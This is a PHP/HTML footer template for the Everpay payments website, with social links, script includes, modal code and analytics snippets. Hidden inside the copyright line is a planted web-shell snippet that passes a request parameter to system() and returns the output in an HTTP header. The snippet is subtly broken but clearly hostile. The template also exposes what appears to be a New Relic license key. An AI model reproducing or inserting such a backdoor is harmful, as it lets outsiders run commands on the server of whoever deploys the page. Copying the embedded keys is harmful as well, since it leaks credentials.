<!--scripts and plugins -->
        
		<!--must need plugin jquery-->
        <footer id="footer" style="margin-bottom; -15px;">
            <div class="row-fluid">

                <div class="row">
                    <div class="col-md-6 col-md-offset-3 text-center margin20">
                        <div class="footer-col footer-3">
              <h3><img src="https://res.cloudinary.com/lmj6rf6tz/image/upload/c_scale,w_120/v1443812014/white_gfqlot.png" class="attachment-full" alt="Everpay"></h3>
                            <p>
                              Everpay Corporation, typically abbreviated to Everpay, is a distributed payments platform which makes everday commerce a simple process and is a leading provider of innovative payment management solutions.</p>
                            <ul class="list-inline social-1">
          <li><a href="//www.linkedin.com/company/everpay-corp?"><i class="fa fa-linkedin"></i></a></li>
          <li><a href="//www.facebook.com/everpay?_rdr"><i class="fa fa-facebook"></i></a></li>
                                <li><a href="https://twitter.com/everpay"><i class="fa fa-twitter"></i></a></li>
           <li><a href="//google.com/+RichardRoweelektropay"><i class="fa fa-google-plus"></i></a></li>
                                <li><a href="//www.pinterest.com/everpay/"><i class="fa fa-pinterest"></i></a></li>
                                           </ul>
                        </div>                        
                    </div><!--footer col-->
          
                </div>
				
            
                <div class="row-fluid">
                        <div class="footer-btm">
						
                    <div class="col-md-12 text-center">
                            <span>
          <ul class="list-inline pull-left">
            <li class="copyright">&COPY;<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo date('Y'); ?> Everpayinc.com - All Rights Reserved.</li>
           </ul>
		    <ul class="list-inline pull-right">
			
        <li><a href="<?=$this->config->item('privacy_url');?>">Privacy</a></li>
        <li><a href="<?=$this->config->item('terms_url');?>">Terms of Service</a></li>
		
        <li><a href="<?=$this->config->item('security_url');?>">Security</a></li>
	  <li><a href="<?=$this->config->item('status_url');?>">Status</a></li>
 <li style="margin-top: 4px;"><iframe allowtransparency="true" frameborder="0" scrolling="no" src="https://platform.twitter.com/widgets/follow_button.html?screen_name=everpay" style="width:120px; height:20px;"></iframe></li>
          </ul>
</span>
                        </div>
                    </div>
                </div>
            </div>
				                </div>
        </footer>
   
<!-- ================================================== End Footer Block -->
	

    <!--scripts and plugins --> 
	   <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->
		
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>

     <script type="text/javascript" src="<?=branded_include('onepage/js/jquery-migrate.min.js');?>"></script>
        <!--bootstrap js plugin-->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js"></script>
 
        <!--easing plugin for smooth scroll-->
       <script type="text/javascript" src="<?=branded_include('onepage/js/jquery.easing.1.3.min.js');?>"></script>
        <!--sticky header-->
           <script type="text/javascript" src="<?=branded_include('onepage/js/jquery.sticky.js');?>"></script>
        <!--parallax background plugin-->
           <script type="text/javascript" src="<?=branded_include('onepage/js/jquery.stellar.min.js');?>"></script>
        <!--image loads plugin -->
          <script type="text/javascript" src="<?=branded_include('onepage/js/jquery.imagesloaded.min.js');?>"></script>
        <!--digit countdown plugin-->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/waypoints/2.0.3/waypoints.min.js"></script>
        <!--digit countdown plugin-->
            <script type="text/javascript" src="<?=branded_include('onepage/js/jquery.counterup.min.js');?>"></script>
        <!--on scroll animation-->
           <script type="text/javascript" src="<?=branded_include('onepage/js/wow.min.js');?>"></script>
        <!--owl carousel slider-->
          <script type="text/javascript" src="<?=branded_include('onepage/js/owl.carousel.min.js');?>"></script>
        <!--popup js-->
           <script type="text/javascript" src="<?=branded_include('onepage/js/jquery.magnific-popup.min.js');?>"></script>       
        <!--isotope js-->
            <script type="text/javascript" src="<?=branded_include('onepage/js/jquery.isotope.min.js');?>"></script>
         <!--cantact form script-->
            <script type="text/javascript" src="<?=branded_include('onepage/js/contact_me.js');?>"></script>
            <script type="text/javascript" src="<?=branded_include('onepage/js/jqBootstrapValidation.js');?>"></script>
        <!--revolution slider plugins-->
          <script type="text/javascript" src="<?=branded_include('onepage/rs-plugin/js/jquery.themepunch.tools.min.js');?>"></script>
          <script type="text/javascript" src="<?=branded_include('onepage/rs-plugin/js/jquery.themepunch.revolution.min.js');?>"></script>
          <script type="text/javascript" src="<?=branded_include('onepage/js/revolution-custom.js');?>"></script>
		
        <!--customizable plugin edit according to your needs-->
            <script type="text/javascript" src="<?=branded_include('onepage/js/custom.js');?>"></script>
            <script type="text/javascript" src="<?=branded_include('onepage/js/isotope-custom.js');?>"></script>
	    	<script type="text/javascript" src="<?=branded_include('js/back-to-top.js');?>"></script>
            <script type="text/javascript" src="<?=branded_include('js/localytics.js');?>"></script>
        <!--sticky header-->
     
		
<script type="text/javascript">
(function() {
	var showTip = function( element ) {
		element.style.display = "block";
		element.style.opacity = 1;	
	};
	
	var hideTip = function( element ) {
		element.style.opacity = 0;
		setTimeout(function() {
			element.style.display = "none";
		}, 700);
	};
	
	document.addEventListener( "DOMContentLoaded", function() {
		var markers = document.querySelectorAll( ".mark" );
		for( var i = 0; i < markers.length; ++i ) {
			var mark = markers[i];
			
			mark.addEventListener( "mouseover", function() {
				showTip( this.nextElementSibling );	
			}, false);
			
			mark.addEventListener( "mouseout", function() {
				hideTip( this.nextElementSibling );	
			}, false);
		}
	});
})();
</script>


		
		<script type="text/javascript">
	   
	//$('.lang-es').remove();


    function viewport() {
    	var e = window, a = 'inner';
    	if ( !( 'innerWidth' in window ) ){
    		a = 'client';
    		e = document.documentElement || document.body;
    	}
    	return { width : e[ a+'Width' ] , height : e[ a+'Height' ] }
    }
    
	function openModal(html,h,w){
		
		document.getElementById('modal_content').innerHTML = '<img src="'+html+'" />';
		document.getElementById('modal_content').style.height = h;
		document.getElementById('modal_content').style.width = w;


		size = viewport();

		document.getElementById('modal_content').style.top = parseInt((size.height - h) /2,10) + 'px';
		document.getElementById('modal_content').style.left = parseInt((size.width - w) /2,10) + 'px';

		document.getElementById('modal_close').style.top = parseInt(((size.height - h) /2)-16,10) + 'px';
		document.getElementById('modal_close').style.left = parseInt((((size.width - w) /2) + w) - 22,10) +'px';
		
		
		document.getElementById('modal_shadow').style.display='block';
		document.getElementById('modal_content').style.display='block';
		document.getElementById('modal_close').style.display='block';
		
	}

	function closeModal() {
		document.getElementById('modal_shadow').style.display='none';
		document.getElementById('modal_content').style.display='none';
		document.getElementById('modal_close').style.display='none';
	}
    
    </script>
	
	<script type="text/javascript">
!function(){var analytics=window.analytics=window.analytics||[];if(!analytics.initialize)if(analytics.invoked)window.console&&console.error&&console.error("Segment snippet included twice.");else{analytics.invoked=!0;analytics.methods=["trackSubmit","trackClick","trackLink","trackForm","pageview","identify","reset","group","track","ready","alias","page","once","off","on"];analytics.factory=function(t){return function(){var e=Array.prototype.slice.call(arguments);e.unshift(t);analytics.push(e);return analytics}};for(var t=0;t<analytics.methods.length;t++){var e=analytics.methods[t];analytics[e]=analytics.factory(e)}analytics.load=function(t){var e=document.createElement("script");e.type="text/javascript";e.async=!0;e.src=("https:"===document.location.protocol?"https://":"http://")+"cdn.segment.com/analytics.js/v1/"+t+"/analytics.min.js";var n=document.getElementsByTagName("script")[0];n.parentNode.insertBefore(e,n)};analytics.SNIPPET_VERSION="3.1.0";
analytics.load("Vmewrvy0RvU9VjPyu3pbSpEm1PkEKYOK");
analytics.page('Signup');
analytics.track('Account Created')
}}();
</script>

	
	<script type="text/javascript">
            var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
            document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
          </script>
          <script type="text/javascript">
            try {
              var pageTracker = _gat._getTracker("(UA-36810004-1)");
            pageTracker._trackPageview();
            } catch(err) {}
    </script>

    <script type="text/javascript">
            var _gaq=[['_setAccount','UA-36810004-1'],['_trackPageview']];
            (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
            g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
            s.parentNode.insertBefore(g,s)}(document,'script'));
    </script>

    <script type="text/javascript">
        if (typeof newrelic == 'object') {
            newrelic.license="87216d9d242bc2bdff9e967f40bd6b4dd1f09b54";
        }
    </script>

    <script type="text/javascript">
        window.intercomSettings = {
            app_id: "z6ftuy9a"
        };
    </script>
    <script>(function(){var w=window;var ic=w.Intercom;if(typeof ic==="function"){ic('reattach_activator');ic('update',intercomSettings);}else{var d=document;var i=function(){i.c(arguments)};i.q=[];i.c=function(args){i.q.push(args)};w.Intercom=i;function l(){var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://widget.intercom.io/widget/z6ftuy9a';var x=d.getElementsByTagName('script')[0];x.parentNode.insertBefore(s,x);}if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})()</script>
		
	</body>
</html>